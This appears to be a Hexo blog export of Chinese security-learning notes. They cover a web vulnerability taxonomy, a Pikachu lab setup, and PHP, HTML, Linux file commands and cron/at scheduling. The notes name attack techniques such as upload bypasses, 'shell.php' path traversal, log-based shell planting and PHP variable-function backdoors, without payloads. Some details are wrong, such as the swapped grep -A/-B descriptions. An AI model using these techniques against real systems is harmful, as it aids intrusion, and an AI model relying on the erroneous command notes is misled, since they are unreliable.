{"meta":{"title":"Hexo","subtitle":"","description":"网络安全学习笔记","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"Web漏洞分类与详解","date":"2025-08-18T03:24:17.822Z","updated":"2025-08-18T07:46:36.159Z","comments":true,"path":"2025/08/18/Web漏洞分类与详解/","permalink":"http://example.com/2025/08/18/Web%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"Web 漏洞分类与详解 一、SQL 注入相关漏洞 基础 SQL 注入（SQLi） web应用程序前端传入后端的参数是可控的，通过控制参数的传递和拼接sql语句可以实现数据库随意查询 报错注入 构造sql语句在数据库执行过程中发生错误，数据库会返回包含错误信息的结果，利用错误信息获取数据库中的敏感数据（版本，表明，列名等） 二次注入（存储型 SQL 注入的特殊形式，输入存储后触发） 已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。 堆叠注入（通过分号执行多条 SQL 语句） 只有当调用数据库函数支持执行多条sql语句时才能够使用，将原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的sql语句了，这个时候我们使用增删查改毫无限制。 盲注 布尔盲注（基于查询结果的真假判断） 时间盲注（基于延迟响应判断） GET 注入（URL 参数） 利用get传参的方式，在网页url后面传输恶意语句，进行sql注入 POST 注入（表单数据） Cookie 注入（Cookie 字段） User-Agent 注入（请求头字段） Referer 注入（请求头字段） 二、跨站脚本（XSS）相关漏洞\\1. 存储型 XSS（恶意脚本存储到服务器，持久触发） \\2. 反射型 XSS（脚本随请求返回，一次性触发） \\3. DOM 型 XSS（客户端 DOM 解析时执行，不经过服务器） 三、命令注入相关漏洞\\1. 直接命令注入（用户输入直接拼接系统命令执行） \\2. 间接命令注入（通过文件上传、配置文件等间接触发） 四、文件操作相关漏洞1.文件上传漏洞（细分 4 类） 后缀名绕过（如.php5、.phtml） MIME 类型绕过（修改Content-Type） 路径遍历结合上传（如..&#x2F;shell.php） 解析漏洞利用（如 IIS&#x2F;nginx 解析缺陷） 1.文件包含漏洞 本地文件包含（LFI，包含服务器本地文件） 远程文件包含（RFI，包含远程恶意文件） \\1. 任意文件读取（未授权读取敏感文件，如&#x2F;etc&#x2F;passwd） \\2. 任意文件删除（未授权删除服务器文件） \\3. 任意文件写入（未授权写入文件，如写入后门） 五、认证与授权漏洞\\1. 弱口令（密码复杂度不足，易被暴力破解） \\2. 默认口令（未修改设备 &#x2F; 系统默认账号密码） \\3. 密码明文传输（未加密传输，如 HTTP 传输密码） \\4. 会话固定（固定会话 ID，诱导用户使用） \\5. 会话劫持（窃取会话 ID 冒充用户） \\6. 越权访问（细分 2 类） 水平越权（访问同权限用户数据，如查他人订单） 垂直越权（低权限访问高权限功能，如普通用户进后台） \\1. 权限提升（通过漏洞获取更高权限） \\2. 认证绕过（直接跳过登录验证，如逻辑缺陷） \\3. 多因素认证缺失（仅单因素认证，易被破解） \\4. 密码重置逻辑漏洞（如验证码复用、重置链接永久有效） 六、跨站请求伪造（CSRF）相关漏洞\\1. 基础 CSRF（诱导用户在已登录状态执行操作） \\2. GET 型 CSRF（利用 GET 请求的幂等性触发） \\3. POST 型 CSRF（利用表单自动提交触发） 七、逻辑漏洞\\1. 支付逻辑漏洞（如价格篡改、重复支付退款） \\2. 订单逻辑漏洞（如越权修改订单状态、重复下单） \\3. 注册逻辑漏洞（如重复注册、批量注册、手机号复用） \\4. 密码找回逻辑漏洞（如跳过验证步骤、验证码泄露） \\5. 验证码逻辑漏洞（如验证码过期时间长、可重复使用） \\6. 业务流程绕过（如跳过关键步骤完成操作） 八、XML 与数据格式相关漏洞\\1. XML 外部实体注入（XXE，利用外部实体读取文件 &#x2F; 执行命令） \\2. XML 注入（修改 XML 结构导致数据篡改或泄露） \\3. XPath 注入（XPath 查询未过滤，导致数据泄露） 九、服务器配置漏洞\\1. 目录遍历（通过..&#x2F;等路径访问非预期目录） \\2. 敏感信息泄露（如 PHPINFO、数据库错误详情、日志泄露） \\3. 服务器版本泄露（响应头暴露 Apache&#x2F;Nginx 版本） \\4. 默认页面未删除（如phpMyAdmin、test.php默认路径） \\5. 目录索引开启（未禁用自动目录列表，泄露文件结构） \\6. 不安全 HTTP 方法（开启 PUT&#x2F;DELETE，允许文件操作） \\7. CORS 配置不当（跨域资源共享规则过松，泄露数据） 十、密码学与传输漏洞\\1. 弱加密算法（如使用 MD5、SHA1 存储密码） \\2. 密钥泄露（硬编码密钥、日志泄露密钥） \\3. 明文存储密码（数据库直接存储明文密码） \\4. 加密传输缺失（未用 HTTPS，数据明文传输） \\5. SSL&#x2F;TLS 配置漏洞（支持弱加密套件、协议版本过低） 十一、API 与新兴技术漏洞\\1. API 未授权访问（接口缺少认证，直接调用） \\2. API 参数篡改（修改接口参数越权操作） 十二、其他类型漏洞\\1. 反序列化漏洞（如 Java&#x2F;PHP 反序列化执行命令） \\2. 服务器端请求伪造（SSRF，诱导服务器请求内网资源） \\3. 点击劫持（通过透明层诱导用户点击非预期按钮） \\4. 模板注入（如 Jinja2&#x2F;Twig 注入，执行代码）","categories":[],"tags":[]},{"title":"","slug":"与MySQL 建立链接","date":"2025-08-15T04:59:11.076Z","updated":"2025-08-15T04:59:11.076Z","comments":true,"path":"2025/08/15/与MySQL 建立链接/","permalink":"http://example.com/2025/08/15/%E4%B8%8EMySQL%20%E5%BB%BA%E7%AB%8B%E9%93%BE%E6%8E%A5/","excerpt":"","text":"交互 把pikachu解压到这个目录 打开install.php 浏览器访问http://127.0.0.1/pikachu-master/install.php，安装初始化 进来了 按理说现在pikachu已经安装好了，去终端看一下，确保已经存在 看一眼users表单 与MySQL 建立链接直接使用PHP 提供的函数。 建立链接 捕获连接错误 错误编号 错误详情 123if(!$link)&#123; exit(&quot;[&quot;.mysqli_connect_errno().&quot;] &quot;.mysqli_connect_error());&#125; tips：“！”取反的意思 关闭链接1mysqli_close($link); 单条SQL 语句执行123$sql = &quot;select * from users;&quot;;$results = mysqli_query($link, $sql); 成功执行！ SQL 错误如果在执行SQL 语句的时候发生错误，mysqli_query 将返回false。可以使用以下函数捕获错误原因： 完美细致的报错 函数速查 函数 说明 mysqli_fetch_row() 以索引数组的方式获取一条记录的数据 mysqli_fetch_assoc() 以关联数组的方式获取一条记录的数据 mysqli_fetch_array() 以索引数组或关联数组的方式获取一条记录的数据 mysqli_fetch_all() 以索引数组或关联数组的方式获取全部记录的数据 mysqli_num_rows() 获取结果集对象中数据条数 mysqli_free_result() 释放与一个结果集合相关的内存 输出： 插入数据 终端查看，发现插入成功","categories":[],"tags":[]},{"title":"","slug":"PHP函数","date":"2025-08-14T05:57:28.311Z","updated":"2025-08-14T08:10:05.797Z","comments":true,"path":"2025/08/14/PHP函数/","permalink":"http://example.com/2025/08/14/PHP%E5%87%BD%E6%95%B0/","excerpt":"","text":"PHP函数1.自定义函数 函数定义 函数就是可以完成固定功能的语句或语句集合，可以重复调用。 函数语言结构 1234567function 函数名(形式参数1,形式参数2...)&#123; //函数体 return 返回值&#125;函数名() 函数传参 12345678// function.phpfunction add($x, $y)&#123; $sum = $x + $y; return $sum;&#125;echo add(10, 3); tips： function 是PHP 的关键字，用于完成函数的定义； 函数名的命名，应该避开PHP 关键字，命名规则与变量的命名规则相同； 形式参数，形参，给函数传递参数用的，仅作占位用； 实际参数，实参，真正参与函数运算的； 函数体，执行函数功能的部分。 返回值，返回给调用的地方，默认返回NULL。 函数调用 函数名＋() tips: 函数的调用，直接函数名字后面加上() 即可，() 可以看作是运算符； 调用函数之后执行的过程是相对独立的，互不干扰，默认没有联系； 函数执行完毕，返回调用的位置继续向下执行。 局部变量 局部变量，就是在函数内部定义的变量，默认情况下，函数外部不能直接访问函数内部定义的变量。 全局变量全局变量是在脚本中，函数或类的外部定义的变量。 用函数传参 1234567$username = &quot;xiu&quot;;function get_name($username)&#123; echo &quot;My name is &#123;$username&#125;&quot;;&#125;get_name($username); 用global 声明变量是全局变量。 按值传参 默认传参方式。 默认参数 可以给形式参数设置默认值，设置方法很简单直接赋值即可！ 给函数默认值的时候，全都给。 由此可见，如果最后add一个数值，将会把这个数指参数赋给x 可变函数也叫变量函数，动态函数，函数名可以动态设置和调用，变量()。这是PHP 特性之一，这种特性通常会被攻击者所利用。 直接把函数名赋值给变量，通过修改变量的值，可以实现动态调用。PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。 最简单后门通过可变函数实际上可以调用任意PHP 函数。","categories":[],"tags":[]},{"title":"","slug":"PHP基础","date":"2025-08-12T12:32:46.859Z","updated":"2025-08-13T09:11:04.132Z","comments":true,"path":"2025/08/12/PHP基础/","permalink":"http://example.com/2025/08/12/PHP%E5%9F%BA%E7%A1%80/","excerpt":"","text":"PHP基础配置好php之后，创建新项目，在notedpad++开始学习代码： 先输出一个123： 加些东西： 在外面写标题，或者写，只要文件后缀是.php，这样是被允许的 如果在里面写了phpinfo(); 会导致敏感信息泄露： 设置变量 $ + 变量名变量名是严格区分大小写；变量名由字母、数字、下划线组成，并且不能以数字开头，也不能包含空白字符、特殊字符等；变量命名时建议做到“见名知意” 变量声明与初始化直接赋值，直接使用。 分支执行语法结构 12345if()&#123;//判断条件，如果判断条件的返回值为True，则执行语句块1，否则执行语句块2 //语句块1&#125;else&#123; //语句块2&#125; 条件示例： 空值触发了判断，输出了else的输出 通过输入?a=&quot;&quot;，写入score值，页面自动做出判断，并输出相应结果。 switch 语句功能与if 语句类似，当需要多向分支结构时，并且判断条件是具体的某个值，此时大多使用switch 结构。 Tips： 表达式的值最好是整形或者字符串。 不要忘记break 语句，用来跳出switch 语句。每个case 语句后面都加上break。 如果某个case 语句后面并没有接语句块，那么就说明这个语句块的内容是同下。 case 后面的语句块是不需要&#123;&#125; 括起来的。 switch示例： 判断条件在编写if 语句时，要求判断条件是一个布尔类型的值。但是实际应用中，是无法保障这一点。如果判断条件是非布尔类型的值，就需要强制转换成布尔类型的值。 while语言结构： 123while(表达式)&#123;//当表达式的值为真的时候，执行循环体。 //循环体&#125; 当表达式的值为true，就执行下面的循环体。当循环体执行结束之后，继续判断表达式的值是true 还是false，如果还是true，那么就继续执行循环体。直到，这个表达式的值为false，那么这个while 语句就执行结束了。 例子：输出1 到100 数字。 do while for语法格式。 123for(;;)&#123;//计数器;判断条件;自增或自减 //循环体&#125; 示例：输出1 到1000 数字。 特殊流程breakbreak 用于switch，for，while，do…while，foreach 等的中断。后面可以接上一个数字来表示跳出几层循环。默认不加就是跳出当前循环语句。 continue 只能用在循环语句，轮空本次循环，并不是结束整个循环语句。 exit表示结束当前整个PHP 脚本的执行。同die() 语句。","categories":[],"tags":[]},{"title":"","slug":"H5初识➕媒体与表单","date":"2025-08-12T04:55:58.717Z","updated":"2025-08-12T07:41:32.098Z","comments":true,"path":"2025/08/12/H5初识➕媒体与表单/","permalink":"http://example.com/2025/08/12/H5%E5%88%9D%E8%AF%86%E2%9E%95%E5%AA%92%E4%BD%93%E4%B8%8E%E8%A1%A8%E5%8D%95/","excerpt":"","text":"H5初识1.1、HTML基本结构 1.2、网页的基本标签1、标题标签h1最大，h6最小 2、段落标签1&lt;p&gt; &lt;p&gt; 3、换行标签1&lt;br /&gt; 4、水平线标签1&lt;hr/&gt; 5、特殊符号 1.3、图像标签常见的图像格式：jpg、gif、png(受浏览器兼容性限制) 1.4、链接标签页面间链接：从一个页面链接到另外一个页面 12&lt;ahref=&quot;path&quot;target=&quot;_self&quot;&gt;文本或者图像&lt;/a&gt;&lt;ahref=&quot;path&quot;target=&quot;_blank&quot;&gt;文本或者图像&lt;/a&gt; 跳转到顶部： 2、表格与表单表格 跨列、跨行 表单method:规定如何发送表单数据常用值,get,post在实际网页开发中通常采用post方式提交表单数据action:表示向何处发送表单数据 表单元素1、文本框 type&#x3D;”text”name：文本框名称(必填)value：文本框初始值size：文本框长度maxlength：文本框可输入最多字符 2、密码框 type&#x3D;”password”name：密码框名称(必填)size：密码框长度 3、单选按钮 type&#x3D;”radio”name：单选框名称(必填)，一组的名称需要相同checked：单选按钮选中状态value：单选框的值 4、复选框 type&#x3D;”checkbox”name：复选框名称(必填)，一组的名称需要相同checked：复选按钮选中状态value：复选框的值 5、下拉列表框 select:下拉列表框option：选项 6、按钮 重置按钮&lt;inputtype&#x3D;”reset”name&#x3D;”butReset”value&#x3D;”reset按钮”&gt;提交按钮&lt;inputtype&#x3D;”submit”name&#x3D;”butSubmit”value&#x3D;”submit按钮”&gt;普通按钮&lt;inputtype&#x3D;”button”name&#x3D;”butButton”value&#x3D;”button按钮”&#x2F;&gt; 完整代码与浏览器预览样式：","categories":[],"tags":[]},{"title":"","slug":"Linux文件管理","date":"2025-08-09T11:35:34.340Z","updated":"2025-08-18T01:00:34.587Z","comments":true,"path":"2025/08/09/Linux文件管理/","permalink":"http://example.com/2025/08/09/Linux%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/","excerpt":"","text":"Linux文件管理1.目录结构1.根目录12/ #根目录起始点，系统中一切文件都从这里存储 2.&#x2F;root 和 &#x2F;home 用户的家目录 &#x2F;root 作用：超级用户（root）的家目录 ​ 特点：​ 默认仅root可访问​ 用于存放 root 的配置文件​ ​ 例如： 12sudo su #切到root用户并进入其家目录ls /root &#x2F;home 作用：存放普通用户的家目录 ​ 特点： ​ 每个用户对应一个子目录 ​ 用户拥有自己的家目录的一切权限 ​ 例如： 123#查看当前用户家目录echo $HOME ls /home 3.&#x2F;etc 系统配置目录 作用：存放系统和应用程序的配置文件 例如： &#x2F;etc&#x2F;passwd 用户的账户密码信息 CentOS 特有的路径 网络配置： 1234567891011121314151617/etc/sysconfig/network-scripts/ifcfg-ens(网卡号) #网卡配置文件/etc/yum.repos.d/CentOS-Base.repo#CentOS中yum/dnf管理器的核心文件/etc/yum.repos.d/CentOS-AppStream.repo#仓库文件的源地址/etc/yum.repos.d/CentOS-Extras.repo#决定系统从哪下mirrorlist #工作方式：直接指定仓库 #工作流程：直接访问指定的URL，下载仓库的数据 若后面跟的地址不可达，会报错baseurl #先访问mirrorlist url，获取镜像地址列表 下载出列表，并开始测试响应速度 选择出最优的镜像进行连接，下载仓库数据 gpgcheck=1 #是否启用仓库，（1为使用；0为不使用）gpgkey= #是仓库的验证密钥 selinux配置： /etc/selinux SElinux #美国国家安全局提出的，强制访问控制安全机制，用于增强linux安全性 自主访问控制安全机制 rw 共三种模式： enforcing 强制模式（默认），严格执行安全策略，有违规会被禁止#军事领域 permissive 标准模式/宽容模式，会允许并记录（你可以访问，但是要被我记录） disable 禁用，完全关闭 SElinuxTYPE: targated: 仅保护安全进程 mls:多级安全策略，#用于军事领域 12345- YUM/DNF 配置： ```bash /etc/yum.repos.d/CentOS-Base.repo #软件源配置 注意事项： 修改配置文件后，通常是要重启服务才能生效 1234#更改主机名sudo vim /etc/hostname#重启生效reboot 4.&#x2F;dev 设备文件目录 作用：管理所有硬件设备和虚拟设备（存放所有的硬件设备） 权限：仅有root和disk用户有操作权限 5.&#x2F;bin和&#x2F;sbin 系统命令目录 &#x2F;bin 二进制目录 作用：存放普通用户和系统管理员都可使用的基础命令 特点： 单用户模式（维护模式）下可用 （Q为什么linux把所有命令要存在目录） 命令多为系统运行必须的核心工具 常见命令： &#x2F;bin&#x2F;ls 查看文件列表 &#x2F;bin&#x2F;cp 复制文件 &#x2F;bin&#x2F;date 显示系统时间 例如： 12#查看系统时间（CentOS 8 默认使用timedatectl）/bin/date &#x2F;sbin 管理系统命令 作用：存放需要管理员权限才能执行的系统管理命令 特点： 普通用户没有没有权限执行，想执行得用（sudo） 命令大多都涉及系统配置与维护 常见命令： &#x2F;sbin&#x2F;service ：管理系统服务（如启动&#x2F;停止服务）。 &#x2F;sbin&#x2F;ifconfig ：查看或配置网络接口（已逐步被 ip 命令替代） &#x2F;sbin&#x2F;reboot ：重启系统。 例子： 123# CentOS 8 使用 systemctl 管理服务（替代旧版 service 命令）/sbin/service network restart # 旧方式（仍可用）systemctl restart NetworkManager # 推荐方式 6.&#x2F;var 存储动态变化的数据目录 （会随着系统运行，不断增长数据量）与 &#x2F;tmp 存放临时文件&#x2F;var 作用：存放运行过程中可变数据 （日志、数据库、邮件） 常见子目录： &#x2F;var&#x2F;log 系统程序数据（syslog、ngiinx&#x2F;access.log） 在能够写入日志的情况下，写入木马病毒，获取Shell &#x2F;var&#x2F;lib 应用程序数据（MySQL数据库，&#x2F;var&#x2F;lib&#x2F;mysql） mysql数据库、docker容器 &#x2F;var&#x2F;spool 队列数据（邮件队列 &#x2F;var&#x2F;spool&#x2F;mail） &#x2F;var&#x2F;log&#x2F;secure 安全认证日志 &#x2F;var&#x2F;log&#x2F;messages 核心系统日志 &#x2F;tmp 作用：存放临时文件（进程或用户手动创建） 特点： 全局可读写 系统重启或定期清理时会自动删除文件（重启会清空） 实际应用： 123#创建临时文件并测试权限touch /tmp/test.tmpchmod 777 /tmp/test.tmp #允许所有用户读写 7.&#x2F;usr 和&#x2F;usr&#x2F;local :系统资源目录 &#x2F;usr 存储静态用户进程 作用：存放系统核心程序、库和文档 子目录： &#x2F;usr&#x2F;bin: 用户命令（gcc，Python） &#x2F;usr&#x2F;lib: 库文件（.so动态库） &#x2F;usr&#x2F;share 共享数据（文档，临时文件） &#x2F;usr&#x2F;local 作用：存放用户手动编译安装的软件 特点： 避免与系统包管理器安装的软件冲突 例如： 123#编译安装软件到 /usr/local./configure --prefix=/usr/localmake &amp;&amp; sudo make install ps:数据性质：&#x2F;var 动态变化 ​ &#x2F;tmp 临时数据 ​ &#x2F;usr 静态只读 是否可以删除： &#x2F;var 部分可删 ​ &#x2F;tmp 可删 ​ &#x2F;usr 不可删 是否需要备份：&#x2F;var 部分需要备份（数据库） ​ &#x2F;tmp 不需要备份 ​ &#x2F;usr 不需要备份 文件大小： &#x2F;var 10G以上，日志可能随时清理 ​ &#x2F;tmp 1G以内 ​ &#x2F;usr 5-20G（Linux基础系统大小） 分区情况： &#x2F;var 建议单独分区 （因为会不断增长） ​ &#x2F;tmp 通常会挂载为tmpfs ​ &#x2F;usr 通常和根目录（&#x2F;）合并 8.&#x2F;boot 系统启动目录 作用： 是启动linux系统的核心文件，这里存放的有内核kernel，临时根文件系统 关键文件： vmlinuz-* ：Linux 内核文件 initrd.img-* ：初始内存盘镜像 &#x2F;boot&#x2F;grub ：GRUB 引导程序配置 操作警告： 误删此目录文件可能导致系统无法启动 2.文件管理命令Linux系统一切皆文件，不以后缀名去识别文件 1.touch创建1234567891011#创建文件touch filename#可以批量创建touch file1 file2#创建目录mkdir 路径和目录名称#创建单层目录mkdir dir1#递归创建嵌套目录（自动补全）mkdir -p dir1/dir2 2.cp 复制文件或目录 用途：复制文件或目录到指定位置 语法： 1cp [选项] 源文件 目标路径 常用选项： 1234cp file.txt backup/ #复制文件到目录cp -r dir1/ dir2/ #递归复制目录cp -f dir1 dir2 #强制复制cp -i dile.txt backup #覆盖前提示确认 3.mv 移动或重命名文件 用途：移动文件或目录，或修改名称 语法： mv 源文件 目标路径或名称 123#### 4.rm 删除 rm -r #删除目录 rm -f #强制删除 rm -rf #强制删除目录及内容 慎用删除多用mv少用rm 123456789101112131415161718#### 5.查询命令- cat - 用途：用于快速查看，合并或创建文件内容，适合小文件，直接内容输出到终端，无交互功能 - 语法： - ```bash cat filename #查看文件内容 cat file1 file 2 #同时显示多个文件 cat file1 file2 &gt; merged_file #合并文件 cat -n /etc/passwd #-n显示行号（包括空行） cat -b 123.txt #-b 显示行号（忽略空行） cat -s -n 123.txt #压缩连续空行为一行 cat -E 123.txt #在行尾显示￥符号 cat高级用法： 创建文件： cat &gt;123.txt &lt;&lt;EOF &gt;ABC &gt;EOF cat 123.txt ABC 1234567 - 追加内容：- ```bash cat file1 &gt;&gt; file2 #将file1内容追加到file2末尾 less 用途：提供用户交互式地滚动浏览文件 语法： less filename 12345678 - 常用选项- ```bash -N:显示行号 -m:显示更详细的提示信息 -E:在文件结束后自动退出 -S:禁用自动换行 高级技巧 用less命令看cat -n的输出（应用管道符） 1234less 查看文件是从头查看，q退出查看 上线箭头可滚动cat -n /etc/passwd | less#管道符的作用：前一条命令的输出 作为后一条命令输入 搜索内容 less中用&#x2F;字符后接搜索模式来向前搜索内容；或用？后接搜索模式来向后搜索内容 查看多个文件 less file1 file2 file3 123456789101112 less中，可使用:n 命令跳转到下一文件，使用:p 命令跳转到上一文件- tail - 用途：查看文件末尾内容，默认显示最后十行 - 语法： - ```bash tail filename #显示文件最后10行 tail -n 20 filename #-n 体现参数显示最后20行 常用选项： -n 指定显示的行数 -f 实时追踪文件变化（常用于监控日志） tail -f /var/log/messages ctrl+c #退出追踪 后期手工对日志进行跟踪 1234567tail 高级技巧：- 结合grep过滤日志：- ``` tail -f app.log | grep &quot;ERROR&quot; 显示从第n行到末尾： tail -n +100 filename 1234567891011121314 #### 6.grep- 用途：是Linux系统中强大的文本搜索工具，，支持正则表达式，用于在文件或输入流中按模式匹配并输出符合条件的行 - 核心功能：快速过滤，定位内容 - 典型场景：日志分析，配置文件搜索，代码审查- 语法：- ```bash grep [选项] “搜索模式” 文件名 - 搜索模式：可以是普通字符串或正则表达式 - 支持多文件，可同时搜索多个文件或目录 常用选项 一、grep命令核心知识点1.基础语法：1grep [选项] “搜索模式” 文件或目录 搜索模式：普通字符串或正则表达式 场景：单文件多文件目录递归搜索 2.常用选项 选项 说明 示例 -i 忽略大小写 grep -i “error” file -v 反向匹配（排除） grep -v “debug” file -n 显示匹配行的行号 grep -n “warning” file -c 统计匹配行数 grep -c “404” file -r &#x2F;-R 递归搜索目录 grep -r “config” &#x2F;etc&#x2F; -w 精确匹配单词 grep -w “java” file -o 仅输出匹配内容（非整行） grep -o “user_[0-9]*” file -A N 显示匹配行及之前N行 grep -A 3 “Exception” file -B N 显示匹配行及之后N行 grep -B 2 “segfault” file -C N 显示匹配行及前后各N行 grep C 2 “timeout” file 3.正则表达式1️⃣基础正则表达式 符号 说明 例子 . 匹配任意单个字符 grep “a.c” file ➡️匹配“abc”“axc” ^ 匹配行首 grep “^start” file $ 匹配行尾 grep “enes$” file [abc] 匹配括号内任意字符 grep “[aeiou]” file [^abc] 匹配不在括号的字符 grep “[ ^0-9]” fiel * 前一个字符重复0次或多次 grep “go*d” file ➡️匹配“git” tips：若输入的内容中存在以上特殊符号，需要用\\来把它编译掉，以免被识别为表达式内容 2️⃣拓展正则表达式（-E 或 egrep） 符号 说明 例子 + 前一个字符重复1次或多次 grep -E “no+” file → 匹配 “no”, “nooo” ？ 前一个字符重复0次或1次 grep -E “colou?r” file → 匹配 “color”,”colour” {n,m} 前一个字符重复n到m次 grep -E “[0-9]{3}” file → 匹配 3 位数字 | 逻辑上的 “或” grep -E “error | warning “ file 二、实验环境准备 创建练习文件 三、分步实验与练习1.基础搜索与选项 实验 1.1：查找错误日志 实验 1.2：忽略大小写匹配 实验 1.3：反向排除调试信息 2. 行号与统计 实验 2.1：显示匹配行号 实验 2.2：统计错误次数 3. 上下文控制 实验 3.1：查看错误上下文，显示每个 “ERROR” 行及其前后各 1 行 4.正则表达式实战 实验 4.1：匹配时间范围 输入grep命令对时间在某范围以内的信息进行筛选和查询","categories":[],"tags":[]},{"title":"text","slug":"text","date":"2025-08-09T04:40:39.000Z","updated":"2025-08-09T04:40:39.046Z","comments":true,"path":"2025/08/09/text/","permalink":"http://example.com/2025/08/09/text/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2025-08-09T04:19:46.238Z","updated":"2025-08-09T04:19:46.238Z","comments":true,"path":"2025/08/09/hello-world/","permalink":"http://example.com/2025/08/09/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"","slug":"一、计划任务概述","date":"2025-08-09T03:55:11.791Z","updated":"2025-08-09T01:43:43.658Z","comments":true,"path":"2025/08/09/一、计划任务概述/","permalink":"http://example.com/2025/08/09/%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"一、计划任务概述1.怎么理解计划任务的定义​ 1️⃣可以自行设定希望它在什么时间或者以什么频率按照预先设定好的去执行的脚本（命令）。 ​ 2️⃣本功能的主要应用范围： ​ （1）按照设置的时间延时执行任务（类似人类设置闹钟叫自己起床） ​ （2）以一定的频率自动循环运行设置好的任务（类似为每天下午四点钟喝水吃零食） ​ （3）无人情况下机器按照设定自行完成任务（无人值守服务器运维） 2.Linux中实现计划任务的两种方法 工具 适用场景 时间精度 特点 at 一次性、延迟任务 秒级 简单，不用长期守护 cron 周期性重复任务 分钟级 复杂，需要长期守护 二、 at 命令2.1 基本语法1at[选项] 时间表达式 [命令] ​ 提交任务：输入命令后按 Ctrl+D 提交。 ​ 查看任务： atq （列出所有任务）。 ​ 删除任务： atrm &lt;任务ID&gt; 。 2.2 时间表达式 灵活时间格式： 1234now # 立即执行now + 5min # 5分钟后05:30 tomorrow/today # 次日5:302025-8-6 11:11 # 绝对时间 举例： 该警告表示计划任务需要使用内置命令才可以 2.3 实战场景入门场景：固定时间任务-每天凌晨2点备份数据库 date命令解释：date 的格式化符号以 % 开头，后接特定字母表示不同时间单位。 符号 含义 示例值 %Y 四位年份 2025 %m 两位月份 05 %d 两位日期 12 %H 24小时制小时 24 %I 12小时制小时 12 %M 两位分钟 22 %S 两位秒 33 %a 星期几缩写 Sun %A 星期几全称 Sunday %b 月份缩写 Apr %B 月份全称 April %F ISO 8601日期格式 2023-07-28 %T 24小时制时间格式 14:30:00 %R 12小时制时间格式 02:30 PM %z 时区偏移 UTC+8 %s 自纪元起经过的秒数 168792300 场景3：复杂时间格式支持灵活时间描述： now ：立即执行 today &#x2F; tomorrow ：当天&#x2F;次日 YYYY-MM-DD HH:MM ：绝对时间 +N days &#x2F; -N minutes ：相对时间 举例：2025年12月25日23:59执行关机： 123at 23:59 Dec 25 2025shutdown -h nowCtrl+D 提交 2.4 管理命令 命令 作用 示例 atq 查看所有等待执行的任务 atq -1（详细列表） atrm 删除任务 atrm 3(删除ID&#x3D;3的任务) at -c 查看任务内容 at -c 5 (查看ID&#x3D;5的任务) 三、 cron 命令详解3.1 cron 核心功能cron 是 Linux&#x2F;Unix 系统中守护周期性任务的进程，适合以下场景： 定时备份（每隔一段时间自动备份） 日志清理（定时删除过期的日志文件） 数据同步（每隔多久同步服务器之间的数据） 监控报警（检测状态并通知） 3.2 配置文件 系统级： &#x2F;etc&#x2F;crontab 编辑模板（所有用户生效）。 语法格式： 123 * * * * * 用户名 命令分钟 小时 日 月 周（“分时日月周”） 3.3 时间表达式 字段说明： 字段 允许值 特殊符号 分 0-59 * , - , &#x2F; , ? 时 0-23 * , - , &#x2F; , ? 日 1-31 * , - , &#x2F; , L 月 1-12 * , - , &#x2F; 周 0-7 * , - , L 举例： 120 2 * * * root /usr/bin/systemctl restart nginx #每日凌晨2点重启Nginx30 4 * * 1-5 user1 /home/user1/backup.sh # 工作日每天4:30备份 3.3 管理命令详解crontab 是 cron 的配置工具，用于安装、删除、编辑用户的计划任务。 命令 作用 示例 crontab -e 编辑当前用户任务 crontab -e crontab -l 列出当前用户任务 crontab -l crontab -r 删除当前用户所有任务 crontab -r crontab -u username 管理其他用户任务（需sudo） sudo crontab -e user1 crontab -i 编辑时交互提示 crontab -i crontab -d 删除用户任务（旧版用法） crontab -d 1.crontab -e ：编辑任务 功能： 打开当前用户的 ~&#x2F;.crontab 文件，支持 vi 或 nano 编辑器（取决于系统默认）。 使用场景： 添加、修改或删除个人定时任务。 示例： bash 12# 添加每日备份任务crontab -e corn 10 3 * * * touch /tmp/test2.t 保存退出后，任务自动生效。 2.crontab -l ：列出任务 功能： 显示当前用户的所有计划任务（格式化输出）。 示例： bash 12[root@xnha ~]# crontab -l0 3 * * * touch /tmp/test2.txt 3.crontab -r ：删除任务 功能： 永久删除当前用户的所有计划任务。 示例： bash 1crontab -r 4.crontab -u username ：管理其他用户 功能： 需要 sudo 权限，用于查看&#x2F;编辑其他用户的任务。 示例： bash 12345[root@xnha ~]# crontab -u user777 -eno crontab for user777 - using an empty onecrontab: installing new crontab[root@xnha ~]# crontab -u user777 -l0 3 * * * touch /tmp/user77 3.4 使用方法场景1：每两个月的工作日的凌晨3点打包备份日志&#x2F;var&#x2F;log&#x2F;secure可以在&#x2F;etc&#x2F;crontab中直接编辑，也可以使用命令crontab -e 进行编辑 1 四、 at vs cron 对比分析 特性 at cron 适用场景 一次性&#x2F;延迟任务 周期性重复任务 时间精度 秒级 分钟级 资源开销 无长期守护进程 需 crond 服务常驻 配置复杂度 简单时间描述 复杂时间表达式 五、 总结与实战案例5.1 关键总结 at ：适合一次性任务（如临时重启服务、延迟执行敏感操作）。 cron ：适合长期周期任务（如每日备份、定时监控） 5.2 综合案例：自动化运维需求：每日凌晨2点备份网站数据到远程服务器： 10 2 * * * root ./linux.sh 每小时检查服务器磁盘使用率，超过90%时发邮件报警： 解决方案：github搜索脚本，按时运行！ 使用 cron 备份： 10 2 * * * rsync -avz /www/user123.com/ user@remote:/backu 2.使用at发送报警： 123456789# 每小时检查磁盘0 * * * * df -h | grep /dev/sda1 | awk &#x27;&#123;print $5&#125;&#x27; | while read -r usage;do if [ &quot;$usage&quot; -gt 90 ]; then at now + 5 minutes -t 